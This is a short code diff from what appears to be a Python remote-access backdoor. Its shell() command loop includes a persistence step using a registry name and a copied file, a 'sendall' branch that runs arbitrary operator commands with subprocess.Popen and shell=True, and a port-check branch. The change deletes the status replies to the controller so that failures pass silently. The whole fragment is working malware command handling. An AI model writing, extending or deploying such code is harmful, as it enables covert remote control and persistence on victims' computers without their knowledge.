@@ -911,11 +911,10 @@ def shell():
                 persist(reg_name, copy_name)
             elif command[:7] == 'sendall':
                 try:
-                    reliable_send('Command Executed')
                     subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                      stdin=subprocess.PIPE)
                 except:
-                    reliable_send('[-]Failed')
+                    continue
             elif command[:6] == "isopen":
                 try:
                     spl = command[7:].split(":")
